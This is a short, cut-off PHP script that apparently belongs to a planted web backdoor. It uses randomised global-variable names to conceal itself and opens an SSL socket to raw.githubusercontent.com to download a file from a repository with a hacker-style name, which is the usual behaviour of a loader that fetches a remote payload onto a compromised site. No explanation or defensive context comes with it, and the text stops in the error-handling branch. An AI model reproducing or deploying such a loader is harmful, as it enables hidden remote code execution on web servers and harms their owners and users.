<?php ${"GLOBALS"}["ywpwbj"]="content";${"GLOBALS"}["ruqhwoixi"]="out";${"GLOBALS"}["mwiqglaifsi"]="errno";${"GLOBALS"}["dnjhlezvvm"]="fp";${"GLOBALS"}["rwueqxkby"]="path";${"GLOBALS"}["dsgugac"]="port";$host="raw.githubusercontent.com";$vobpopp="errstr";${${"GLOBALS"}["dsgugac"]}=443;${${"GLOBALS"}["rwueqxkby"]}="/vLain1337/dface/main/tahi/cache-new.txt";${${"GLOBALS"}["dnjhlezvvm"]}=stream_socket_client("ssl://$host:$port",${${"GLOBALS"}["mwiqglaifsi"]},${$vobpopp},30);if(!${${"GLOBALS"}["dnjhlezvvm"]}){echo"Error: $errstr ($errno)<br />
